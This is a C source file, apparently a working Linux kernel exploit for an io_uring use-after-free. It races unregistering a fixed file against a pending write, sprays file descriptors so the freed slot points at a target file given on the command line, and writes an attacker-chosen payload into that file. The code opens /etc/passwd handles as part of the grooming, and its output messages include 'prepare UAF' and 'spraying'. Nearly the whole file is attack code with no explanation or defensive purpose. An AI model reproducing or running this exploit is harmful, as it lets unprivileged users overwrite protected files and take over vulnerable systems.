#include <errno.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/poll.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
#include <assert.h>

#include "liburing.h"

int group_id = 1337;
int victim_fd = 0;
int control_pipes[2];
int data_pipes[2];
struct io_uring ring;

char buffer[10];
char payload[1024*1024*100];
int payload_len = 0;

void * payload_fuse_addr = NULL;
const char * target_path = NULL;

void consume() {
    struct io_uring_cqe *cqe;
    int ret = io_uring_wait_cqe(&ring, &cqe);
    printf("consuming..\n");
    if (ret < 0) {
        printf("Error when consuming: %s\n",
                strerror(-ret));
        return;
    }
    if (!cqe) return;
    /* Now that we have the CQE, let's process the data */
    if (cqe->res < 0) {
        printf("Error in async operation: %s\n", strerror(-cqe->res));
        ;
    }
    printf("Result: %d\n", cqe->res);
    printf("%lld\n", cqe->user_data);
    io_uring_cqe_seen(&ring, cqe);
}

void * work2(void *) {
    int victim_fd = open("./write", O_RDWR|O_CREAT, 0777);
	void * buffer = mmap(NULL, 0x100000000, 6, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    assert(buffer != (void *)-1);
    int ret = write(victim_fd, buffer, 0x100000000);
    assert(ret > 0);
}

void * work(void *) {
    struct io_uring_sqe * sqe;
    //usleep(20000);
    /*
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_read(sqe, control_pipes[0], buffer, 1, 0);
    sqe->flags |= IOSQE_IO_LINK;
    sqe->user_data = 1;
    */


    sqe = io_uring_get_sqe(&ring);
    //io_uring_prep_write(sqe, 0, payload_fuse_addr, payload_len, 0); // read from register file
    //struct iovec vec[2];
    //vec[0].iov_base = payload_fuse_addr;
    //vec[0].iov_len = payload_len;

    //vec[1].iov_base = payload;
    //vec[1].iov_len = payload_len;
    //io_uring_prep_writev(sqe, 0, vec, 2, 0); // read from register file
    //
    //io_uring_prep_splice(sqe, data_pipes[0], -1, 0, 0, payload_len, 0); // read from register file
    io_uring_prep_write(sqe, 0, payload, payload_len, 0); // read from register file
    
    sqe->flags |= IOSQE_FIXED_FILE;
    sqe->user_data = 2;

    io_uring_submit(&ring);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("usage: %s <target file> <source>", argv[0]);
    }
    int fd = open(argv[2], 0);
    assert(fd >= 0);

    payload_len = read(fd, payload, sizeof(payload));
    assert(payload_len >= 1);
    close(fd);
    target_path = argv[1];

    struct io_uring_params params;
    memset(&params, 0, sizeof(params));
    //params.flags |= IORING_SETUP_SQPOLL;
    //params.sq_thread_idle = 3000;

    if (io_uring_queue_init_params(128, &ring, &params) < 0) {
        perror("io_uring_init_failed...\n");
        exit(1);
    }

    int ret;
    ret = pipe(control_pipes);
    assert(ret == 0);
    ret = pipe(data_pipes);
    assert(ret == 0);

	//int fuse_fd = open("fuse_mount/hello", O_RDWR);
    const int FD_MAX = 102400;
    int fds[FD_MAX];
    for (int i = 0; i < FD_MAX; i++) {
        int fd = open("/etc/passwd", 0);
        assert( fd>=0 );
        fds[i] = fd;
        if (i == FD_MAX/2+1)
            victim_fd = open("./write", O_RDWR|O_CREAT, 0777);
    }
    for (int i = 0; i < FD_MAX; i+=2) {
        close(fds[i]);
    }
    struct iovec iovec_value;
    iovec_value.iov_base = payload;
    iovec_value.iov_len = payload_len;

    //ret = write(fuse_fd, &iovec_value, sizeof(iovec_value));
    //assert(ret == sizeof(iovec_value));
	//payload_fuse_addr = mmap(NULL, sizeof(iovec_value), PROT_READ, MAP_SHARED, fuse_fd, 0);
    //assert(payload_fuse_addr != (void*)(-1));

    //ret = write(fuse_fd, payload, payload_len);
    //assert(ret == payload_len);
	//payload_fuse_addr = mmap(NULL, payload_len, PROT_READ, MAP_SHARED, fuse_fd, 0);
    //assert(payload_fuse_addr != (void*)(-1));
    
    assert(victim_fd >= 0);
    ret = io_uring_register_files(&ring, &victim_fd, 1);
    assert(ret == 0);
    pthread_t thread2;
    pthread_create(&thread2, NULL, work2, NULL);

    pthread_t thread;
    pthread_create(&thread, NULL, work, NULL);
    printf("prepare UAF...\n");
    io_uring_unregister_files(&ring);
    printf("done\n");
    close(victim_fd);
    printf("spraying..\n");
    for (int i = 0; i < FD_MAX; i+=2) {
        if (i % 10000 == 0) {
            printf("%d..\n", i);
        }
        int fd = open(target_path, 0);
        assert(fd >= 0);
    }

    //write(control_pipes[1], "1", 1);
    //write(data_pipes[1], payload, payload_len);
    consume();
    //consume();
    //close(pipes[1]);
}

